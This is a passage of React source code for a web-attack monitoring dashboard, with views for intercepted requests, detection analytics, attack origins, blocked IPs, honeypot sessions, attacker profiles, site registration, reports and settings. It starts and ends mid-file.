                                  borderRadius: 3,
                                  fontSize: 10,
                                  color: T.blue,
                                  fontFamily: "monospace",
                                }}
                              >
                                {e.method}
                              </span>
                            </td>
                            <td style={{ padding: "8px 8px", fontFamily: "monospace", fontSize: 11 }}>{e.path}</td>
                            <td style={{ padding: "8px 8px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "2px 6px",
                                  borderRadius: 3,
                                  fontSize: 11,
                                }}
                              >
                                {e.type}
                              </span>
                            </td>
                            <td style={{ padding: "8px 8px" }}>
                              <Badge level={e.level} small />
                            </td>
                            <td style={{ padding: "8px 8px", minWidth: 90 }}>
                              <ScoreBar score={e.score} compact />
                            </td>
                            <td style={{ padding: "8px 8px", color: T.muted, fontSize: 11 }}>
                              {isExpanded ? "▲ Hide" : "▼ Inspect"}
                            </td>
                          </tr>
                          {isExpanded && (
                            <tr style={{ background: T.surface2 }}>
                              <td colSpan={9} style={{ padding: "12px 14px", borderBottom: `1px solid ${T.border}` }}>
                                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                                  <div>
                                    <div style={{ color: T.muted, fontSize: 11, marginBottom: 4 }}>
                                      INTERCEPTED PAYLOAD:
                                    </div>
                                    <pre
                                      style={{
                                        margin: 0,
                                        background: T.bg,
                                        padding: 8,
                                        borderRadius: 4,
                                        fontSize: 11,
                                        color: T.critical,
                                        fontFamily: "monospace",
                                        overflowX: "auto",
                                      }}
                                    >
                                      {e.payload}
                                    </pre>
                                  </div>
                                  <div>
                                    <div style={{ color: T.muted, fontSize: 11, marginBottom: 4 }}>
                                      DEFENSE ACTION & TELEMETRY:
                                    </div>
                                    <div style={{ fontSize: 11, color: T.text, lineHeight: 1.6 }}>
                                      <div>
                                        Status: <span style={{ color: T.green }}>{e.status}</span>
                                      </div>
                                      <div>
                                        Origin ISP: <span style={{ color: T.muted }}>{e.isp}</span>
                                      </div>
                                      <div style={{ marginTop: 6, display: "flex", gap: 8 }}>
                                        <Btn
                                          small
                                          danger
                                          onClick={() => {
                                            apiBlockIP(e.ip, `${e.type} attack detected`);
                                            setBlockedList((p) => [
                                              {
                                                ip: e.ip,
                                                reason: `${e.type} attack detected`,
                                                blockedAt: new Date().toISOString().replace("T", " ").slice(0, 16),
                                                expires: "Permanent",
                                                permanent: true,
                                              },
                                              ...p,
                                            ]);
                                          }}
                                        >
                                          Block IP
                                        </Btn>
                                        <Btn small onClick={() => onOpenAttacker(e.ip)}>
                                          Attacker Profile →
                                        </Btn>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          )}
                        </>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 3: ANALYTICS ════ */}
          {activeNav === "analytics" && (
            <div>
              {/* Analytics KPI Row */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🎯"
                  label="Avg Detection Rate"
                  value="91.3%"
                  sub="7-day average"
                  color={T.green}
                />
                <StatCard
                  icon="⚠️"
                  label="Avg FP Rate"
                  value="4.6%"
                  sub="Target: < 5%"
                  color={T.medium}
                />
                <StatCard
                  icon="⏱️"
                  label="Avg Latency (P95)"
                  value="1.8s"
                  sub="Target: < 3s"
                  color={T.blue}
                />
                <StatCard
                  icon="🚀"
                  label="Requests Analysed"
                  value="2.1M"
                  sub="Last 7 days"
                  color={T.purple}
                />
              </div>

              {/* Charts Row */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle icon="📊" title="ATTACKS BY TYPE (vs False Positives)" />
                  <ResponsiveContainer width="100%" height={180}>
                    <BarChart
                      data={[
                        { name: "SQLi", attacks: 120, fp: 6 },
                        { name: "XSS", attacks: 80, fp: 4 },
                        { name: "BruteForce", attacks: 48, fp: 2 },
                        { name: "PathTraversal", attacks: 32, fp: 1 },
                        { name: "Scanner", attacks: 25, fp: 2 },
                      ]}
                      margin={{ top: 10, right: 10, bottom: 0, left: -10 }}
                    >
                      <XAxis dataKey="name" tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <YAxis tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 4,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                      <Bar dataKey="attacks" fill={T.blue} radius={[3, 3, 0, 0]} />
                      <Bar dataKey="fp" fill={T.critical} radius={[3, 3, 0, 0]} />
                    </BarChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 11 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.blue, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>Attacks Detected</span>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.critical, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>False Positives</span>
                    </div>
                  </div>
                </Card>

                <Card>
                  <PanelTitle icon="📈" title="DETECTION RATE vs FP RATE (7 DAYS)" />
                  <ResponsiveContainer width="100%" height={180}>
                    <LineChart
                      data={[
                        { day: "Mon", detection: 91.1, fp: 4.8 },
                        { day: "Tue", detection: 91.5, fp: 4.6 },
                        { day: "Wed", detection: 90.8, fp: 4.9 },
                        { day: "Thu", detection: 92.0, fp: 4.2 },
                        { day: "Fri", detection: 91.4, fp: 4.5 },
                        { day: "Sat", detection: 92.3, fp: 4.1 },
                        { day: "Sun", detection: 91.8, fp: 4.3 },
                      ]}
                      margin={{ top: 10, right: 10, bottom: 0, left: -10 }}
                    >
                      <XAxis dataKey="day" tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <YAxis domain={[0, 100]} tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 4,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                      <Line dataKey="detection" stroke={T.green} strokeWidth={2} dot={{ r: 3 }} />
                      <Line dataKey="fp" stroke={T.critical} strokeWidth={2} dot={{ r: 3 }} />
                    </LineChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 11 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.green, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>Detection Rate (%)</span>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.critical, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>False Positive Rate (%)</span>
                    </div>
                  </div>
                </Card>
              </div>

              {/* Model Performance Breakdown Matrix */}
              <Card>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
                  <PanelTitle icon="🧪" title="MODEL PERFORMANCE BREAKDOWN (OFFICIAL CSIC 2010 BENCHMARK)" />
                  <span
                    style={{
                      background: "rgba(0, 229, 255, 0.12)",
                      border: `1px solid ${T.blue}`,
                      color: T.blue,
                      fontSize: 11,
                      fontFamily: "monospace",
                      padding: "2px 8px",
                      borderRadius: 4,
                    }}
                  >
                    Dataset: CSIC 2010 (70/30 Split · 144 Features)
                  </span>
                </div>

                {mlMeta && (
                  <div
                    style={{
                      display: "grid",
                      gridTemplateColumns: "repeat(5, 1fr)",
                      gap: 10,
                      marginBottom: 16,
                      background: T.surface2,
                      padding: 10,
                      borderRadius: 6,
                      border: `1px solid ${T.border}`,
                    }}
                  >
                    <div>
                      <div style={{ color: T.muted, fontSize: 10 }}>ACCURACY</div>
                      <div style={{ color: T.blue, fontWeight: 700, fontSize: 15, fontFamily: "monospace" }}>
                        {(mlMeta.accuracy * 100).toFixed(2)}%
                      </div>
                    </div>
                    <div>
                      <div style={{ color: T.muted, fontSize: 10 }}>PRECISION</div>
                      <div style={{ color: T.text, fontWeight: 700, fontSize: 15, fontFamily: "monospace" }}>
                        {(mlMeta.precision * 100).toFixed(2)}%
                      </div>
                    </div>
                    <div>
                      <div style={{ color: T.muted, fontSize: 10 }}>RECALL</div>
                      <div style={{ color: T.green, fontWeight: 700, fontSize: 15, fontFamily: "monospace" }}>
                        {(mlMeta.recall * 100).toFixed(2)}%
                      </div>
                    </div>
                    <div>
                      <div style={{ color: T.muted, fontSize: 10 }}>F1-SCORE</div>
                      <div style={{ color: T.purple, fontWeight: 700, fontSize: 15, fontFamily: "monospace" }}>
                        {(mlMeta.f1_score * 100).toFixed(2)}%
                      </div>
                    </div>
                    <div>
                      <div style={{ color: T.muted, fontSize: 10 }}>FALSE POSITIVE RATE</div>
                      <div style={{ color: mlMeta.false_positive_rate <= 4.5 ? T.green : T.critical, fontWeight: 700, fontSize: 15, fontFamily: "monospace" }}>
                        {Number(mlMeta.false_positive_rate).toFixed(2)}%
                      </div>
                    </div>
                  </div>
                )}

                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Attack Class", "Precision", "Recall", "F1 Score", "Support (Test Set)"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            fontWeight: 500,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      { class: "Normal (Clean)", precision: "0.96", recall: "0.96", f1: "0.96", support: "2,400" },
                      { class: "SQLi (Injection)", precision: "0.96", recall: "0.92", f1: "0.94", support: "2,057" },
                      { class: "XSS (Cross-Site Script)", precision: "0.92", recall: "0.89", f1: "0.90", support: "148" },
                      { class: "Path Traversal (LFI)", precision: "0.91", recall: "0.88", f1: "0.89", support: "112" },
                      { class: "Scanner & Probes", precision: "0.97", recall: "0.95", f1: "0.96", support: "83" },
                    ].map((m) => (
                      <tr key={m.class} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "6px 8px", fontWeight: 600, color: T.text }}>{m.class}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.blue }}>{m.precision}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.green }}>{m.recall}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.purple }}>{m.f1}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.muted }}>{m.support}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </Card>
            </div>
          )}

          {/* ════ VIEW 4: GEO MAP ════ */}
          {activeNav === "geo" && (
            <div>
              <Card style={{ marginBottom: 14 }}>
                <PanelTitle icon="🌍" title="GLOBAL ATTACK ORIGIN DISTRIBUTION" right="Live Sensor Feeds" />
                <RealtimeGeoThreatMap
                  events={events}
                  newId={newId}
                  isWsConnected={isWsConnected}
                  onNodeClick={(node) => {
                    if (node.ip) setSelectedAttackerIP(node.ip);
                    setActiveNav("attackers");
                  }}
                />
              </Card>

              <Card>
                <PanelTitle icon="🏳️" title="ORIGIN NATION BREAKDOWN" />
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Country", "Total Attacks", "Primary Vector", "Severity", "Traffic Share"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            fontWeight: 500,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      { country: "🇨🇳 China", count: 47, vector: "SQL Injection", level: "CRITICAL", share: "32%" },
                      { country: "🇷🇺 Russia", count: 31, vector: "Vulnerability Scanners", level: "HIGH", share: "22%" },
                      { country: "🇧🇷 Brazil", count: 28, vector: "Cross-Site Scripting", level: "HIGH", share: "19%" },
                      { country: "🇩🇪 Germany", count: 19, vector: "Credential Brute Force", level: "MEDIUM", share: "13%" },
                      { country: "🇮🇳 India", count: 14, vector: "Path Traversal", level: "MEDIUM", share: "9%" },
                      { country: "🇺🇸 USA", count: 9, vector: "Automated Bot Probe", level: "LOW", share: "5%" },
                    ].map((row) => (
                      <tr key={row.country} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "6px 8px", fontWeight: 600, color: T.text }}>{row.country}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.blue }}>{row.count}</td>
                        <td style={{ padding: "6px 8px", color: T.muted }}>{row.vector}</td>
                        <td style={{ padding: "6px 8px" }}>
                          <Badge level={row.level} small />
                        </td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.text }}>{row.share}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </Card>
            </div>
          )}

          {/* ════ VIEW 5: BLOCKED IPS ════ */}
          {activeNav === "blocked" && (
            <Card>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 16,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 14 }}>🚫</span>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>BLOCKED IPS MANAGEMENT</span>
                  <span style={{ color: T.muted, fontSize: 12 }}>({blockedList.length} blocked)</span>
                </div>
                <div style={{ display: "flex", gap: 8 }}>
                  <Btn small primary onClick={() => setBlockIPModal(true)}>
                    + Block IP Manually
                  </Btn>
                  <Btn
                    small
                    onClick={() => {
                      const csv =
                        "IP,Reason,BlockedAt,Expires\n" +
                        blockedList.map((b) => `${b.ip},"${b.reason}",${b.blockedAt},${b.expires}`).join("\n");
                      const blob = new Blob([csv], { type: "text/csv" });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement("a");
                      a.href = url;
                      a.download = "blocked_ips.csv";
                      a.click();
                    }}
                  >
                    Export List
                  </Btn>
                </div>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["IP Address", "Reason", "Blocked At", "Expires", "Action"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontWeight: 500,
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {blockedList.map((b) => (
                      <tr key={b.ip} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td
                          style={{
                            padding: "8px 8px",
                            fontFamily: "monospace",
                            color: T.blue,
                            fontWeight: 600,
                            cursor: "pointer",
                          }}
                          onClick={() => onOpenAttacker(b.ip)}
                        >
                          {b.ip}
                        </td>
                        <td style={{ padding: "8px 8px", color: T.text }}>{b.reason}</td>
                        <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                          {b.blockedAt}
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <span
                            style={{
                              color: b.permanent ? T.critical : T.medium,
                              fontFamily: "monospace",
                              fontSize: 11,
                              fontWeight: 600,
                            }}
                          >
                            {b.expires}
                          </span>
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <Btn small danger onClick={() => handleUnblock(b.ip)}>
                            Unblock
                          </Btn>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 6: HONEYPOT SESSIONS ════ */}
          {activeNav === "honeypot" && (
            <div>
              {/* Honeypot Stat Cards */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🍯"
                  label="Total Sessions"
                  value={honeypotSessions.length}
                  sub="All time: 142"
                  color={T.purple}
                />
                <StatCard
                  icon="🟢"
                  label="Live Now"
                  value={honeypotLiveCount}
                  sub="Actively trapped"
                  color={T.low}
                />
                <StatCard
                  icon="⏱️"
                  label="Avg Duration"
                  value="2m 18s"
                  sub="Per session"
                  color={T.blue}
                />
              </div>

              <Card>
                <PanelTitle
                  icon="🍯"
                  title="HONEYPOT SESSIONS"
                  right={<span style={{ color: T.muted, fontSize: 11 }}>Click a session to view captured actions</span>}
                />

                <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                  {honeypotSessions.map((s) => {
                    const isExp = expandedSessionId === s.id;
                    return (
                      <div
                        key={s.id}
                        style={{
                          background: T.surface2,
                          border: `1px solid ${isExp ? T.purple + "60" : T.border}`,
                          borderRadius: 6,
                          overflow: "hidden",
                        }}
                      >
                        <div
                          onClick={() => setExpandedSessionId(isExp ? null : s.id)}
                          style={{
                            padding: "10px 14px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            cursor: "pointer",
                          }}
                        >
                          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                            <span
                              style={{
                                width: 8,
                                height: 8,
                                borderRadius: "50%",
                                background: s.live ? T.low : T.muted,
                                boxShadow: s.live ? `0 0 6px ${T.low}` : "none",
                              }}
                            />
                            <div>
                              <span style={{ fontFamily: "monospace", fontSize: 12, color: T.blue, fontWeight: 600 }}>
                                {s.ip}
                              </span>
                              <span style={{ color: T.muted, fontSize: 11, marginLeft: 8 }}>{s.country}</span>
                            </div>
                            <span style={{ color: T.muted, fontSize: 11 }}>
                              Started {s.started} · {s.live ? "ongoing" : "ended"}
                            </span>
                          </div>

                          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                            <div style={{ textAlign: "right" }}>
                              <span style={{ fontFamily: "monospace", fontSize: 11, color: T.text }}>{s.duration}</span>
                              <div style={{ fontSize: 10, color: T.muted }}>{s.requestsCount} requests</div>
                            </div>
                            <span style={{ color: T.muted, fontSize: 12 }}>{isExp ? "▲" : "▼"}</span>
                          </div>
                        </div>

                        {/* Expanded Actions Table */}
                        {isExp && (
                          <div style={{ padding: "0 14px 14px", borderTop: `1px solid ${T.border}40` }}>
                            <div
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                margin: "10px 0 8px",
                              }}
                            >
                              <div style={{ fontSize: 11, fontWeight: 600, color: T.muted }}>CAPTURED ACTIONS</div>
                              <Btn small onClick={() => setTerminalReplaySession(s)}>
                                ▶ Replay Virtual Shell Session
                              </Btn>
                            </div>

                            <table style={{ width: "100%", fontSize: 11, borderCollapse: "collapse" }}>
                              <thead>
                                <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                                  {["Time", "Method", "Endpoint", "Tool Fingerprint"].map((h) => (
                                    <th
                                      key={h}
                                      style={{
                                        color: T.muted,
                                        textAlign: "left",
                                        padding: "4px 6px",
                                        fontWeight: 500,
                                      }}
                                    >
                                      {h}
                                    </th>
                                  ))}
                                </tr>
                              </thead>
                              <tbody>
                                {s.actions.map((act, i) => (
                                  <tr key={i} style={{ borderBottom: `1px solid ${T.border}20` }}>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.muted }}>
                                      {act.time}
                                    </td>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.blue }}>
                                      {act.method}
                                    </td>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.text }}>
                                      {act.endpoint}
                                    </td>
                                    <td style={{ padding: "5px 6px" }}>
                                      <span
                                        style={{
                                          background: T.critBg,
                                          border: `1px solid ${T.critical}60`,
                                          color: T.critical,
                                          padding: "1px 6px",
                                          borderRadius: 3,
                                          fontSize: 10,
                                          fontFamily: "monospace",
                                        }}
                                      >
                                        {act.tool}
                                      </span>
                                    </td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </Card>
            </div>
          )}

          {/* ════ VIEW 7: ATTACKERS GRID ════ */}
          {activeNav === "attackers" && (
            <div>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 16,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ flex: 1, maxWidth: 360 }}>
                  <input
                    value={attackerSearch}
                    onChange={(e) => setAttackerSearch(e.target.value)}
                    placeholder="Search by IP or country..."
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 5,
                      padding: "8px 12px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <span style={{ color: T.muted, fontSize: 12 }}>{filteredAttackers.length} attackers tracked</span>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14 }}>
                {filteredAttackers.map((att) => (
                  <Card key={att.ip} style={{ padding: "16px" }}>
                    <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", marginBottom: 12 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        <div
                          style={{
                            width: 36,
                            height: 36,
                            borderRadius: "50%",
                            background: `linear-gradient(135deg, ${T.surface2}, ${sevColor[att.level]}40)`,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontSize: 16,
                          }}
                        >
                          🤖
                        </div>
                        <div>
                          <div style={{ fontFamily: "monospace", fontSize: 14, fontWeight: 700, color: T.text }}>
                            {att.ip}
                          </div>
                          <div style={{ fontSize: 11, color: T.muted }}>
                            {att.flag} {att.city}, {att.country}
                          </div>
                        </div>
                      </div>
                      <Badge level={att.level} small />
                    </div>

                    <div style={{ fontSize: 11, color: T.muted, marginBottom: 8 }}>
                      <div>ISP: {att.isp}</div>
                      <div>Sessions: {att.sessions} · Total attacks: {att.total} · Last seen: {att.last}</div>
                    </div>

                    <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 12 }}>
                      {att.tools.length > 0 ? (
                        att.tools.map((t) => (
                          <span
                            key={t}
                            style={{
                              background: T.critBg,
                              border: `1px solid ${T.critical}50`,
                              color: T.critical,
                              padding: "2px 8px",
                              borderRadius: 3,
                              fontSize: 10,
                              fontFamily: "monospace",
                            }}
                          >
                            {t}
                          </span>
                        ))
                      ) : (
                        <span style={{ color: T.muted, fontSize: 10 }}>No tools fingerprinted</span>
                      )}
                    </div>

                    <Btn
                      small
                      style={{ width: "100%", justifyContent: "center" }}
                      onClick={() => onOpenAttacker(att.ip)}
                    >
                      View Full Profile →
                    </Btn>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* ════ VIEW 8: SITES MANAGEMENT ════ */}
          {activeNav === "sites" && (
            <Card>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 16 }}>
                <div>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>REGISTERED SITES</span>
                  <span style={{ color: T.muted, fontSize: 12, marginLeft: 8 }}>({sites.length} sites)</span>
                </div>
                <Btn small primary onClick={() => setAddSiteModal(true)}>
                  + Register New Site
                </Btn>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Website", "API Key", "Status", "Created", "Checks (24h)", "Actions"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontWeight: 500,
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {sites.map((st) => (
                      <tr key={st.key} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "8px 8px", fontWeight: 600, color: T.blue }}>
                          <a
                            href={st.url}
                            target="_blank"
                            rel="noreferrer"
                            style={{ color: T.blue, textDecoration: "none" }}
                          >
                            {st.url}
                          </a>
                        </td>
                        <td style={{ padding: "8px 8px", fontFamily: "monospace", color: T.muted, fontSize: 11 }}>
                          {st.key.slice(0, 10)}...
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <span
                            style={{
                              color: st.status === "Active" ? T.low : T.high,
                              fontSize: 11,
                              fontWeight: 600,
                            }}
                          >
                            ● {st.status}
                          </span>
                        </td>
                        <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                          {st.created}
                        </td>
                        <td style={{ padding: "8px 8px", fontFamily: "monospace", color: T.text }}>{st.checks}</td>
                        <td style={{ padding: "8px 8px" }}>
                          <Btn small>Settings</Btn>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 9: REPORTS ════ */}
          {activeNav === "reports" && (
            <div>
              <Card style={{ marginBottom: 16 }}>
                <PanelTitle icon="📄" title="GENERATE NEW REPORT" />
                <div style={{ display: "flex", alignItems: "center", gap: 12, flexWrap: "wrap", marginBottom: 10 }}>
                  <div>
                    <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>From</label>
                    <input
                      type="date"
                      defaultValue="2026-06-01"
                      style={{
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 12,
                      }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>To</label>
                    <input
                      type="date"
                      defaultValue="2026-06-07"
                      style={{
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 12,
                      }}
                    />
                  </div>
                  <div style={{ alignSelf: "flex-end" }}>
                    <Btn primary onClick={() => setReportSuccessModal(true)}>
                      📊 Generate PDF Report
                    </Btn>
                  </div>
                </div>
                <p style={{ color: T.muted, fontSize: 12, margin: 0 }}>
                  Report includes executive summary, attack breakdown charts, top 20 threat events, and attacker profiles
                  for the selected period.
                </p>
              </Card>

              <Card>
                <PanelTitle icon="🗄️" title="REPORT HISTORY" />
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  {[
                    {
                      name: "Weekly Threat Report — Jun 1-7",
                      sub: "Jun 1 – Jun 7, 2026 · generated 2026-06-07 09:00",
                      size: "430 KB",
                    },
                    {
                      name: "Weekly Threat Report — May 25-31",
                      sub: "May 25 – May 31, 2026 · generated 2026-05-31 09:00",
                      size: "481 KB",
                    },
                    {
                      name: "Monthly Summary — May 2026",
                      sub: "May 1 – May 31, 2026 · generated 2026-06-01 09:05",
                      size: "1.2 MB",
                    },
                  ].map((r, i) => (
                    <div
                      key={i}
                      style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        padding: "8px 12px",
                        background: T.surface2,
                        borderRadius: 5,
                      }}
                    >
                      <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                        <span>📄</span>
                        <div>
                          <div style={{ fontSize: 12, fontWeight: 600, color: T.text }}>{r.name}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{r.sub}</div>
                        </div>
                      </div>
                      <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                        <span style={{ fontSize: 11, fontFamily: "monospace", color: T.muted }}>{r.size}</span>
                        <Btn small onClick={() => alert(`Downloading ${r.name}...`)}>
                          Download
                        </Btn>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>
            </div>
          )}

          {/* ════ VIEW 10: SETTINGS ════ */}
          {activeNav === "settings" && (
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
              {/* Column 1: Account */}
              <Card>
                <PanelTitle icon="👤" title="ACCOUNT" />
                <div style={{ marginBottom: 14 }}>
                  <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Email</label>
                  <input
                    defaultValue="client@example.com"
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "8px 10px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <div style={{ marginBottom: 16 }}>
                  <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Company Name</label>
                  <input
                    defaultValue="SnapNest Pvt Ltd"
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "8px 10px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <Btn primary small onClick={() => alert("Changes saved successfully!")}>
                  Save Changes
                </Btn>

                <div style={{ borderTop: `1px solid ${T.border}`, marginTop: 20, paddingTop: 16 }}>
                  <div style={{ fontSize: 12, fontWeight: 600, color: T.text, marginBottom: 6 }}>
                    JWT / Master API Key
                  </div>
                  <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
                    <input
                      type={showApiKey ? "text" : "password"}
                      value={apiKey}
                      readOnly
                      style={{
                        flex: 1,
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 11,
                        fontFamily: "monospace",
                      }}
                    />
                    <Btn small onClick={() => setShowApiKey(!showApiKey)}>
                      {showApiKey ? "Hide" : "Show"}
                    </Btn>
                  </div>
                  <Btn small danger onClick={handleRegenerateKey}>
                    Regenerate Key
                  </Btn>
                </div>
              </Card>

              {/* Column 2: Notification Preferences & Danger Zone */}
              <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <Card>
                  <PanelTitle icon="🔔" title="NOTIFICATION PREFERENCES" />
                  <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
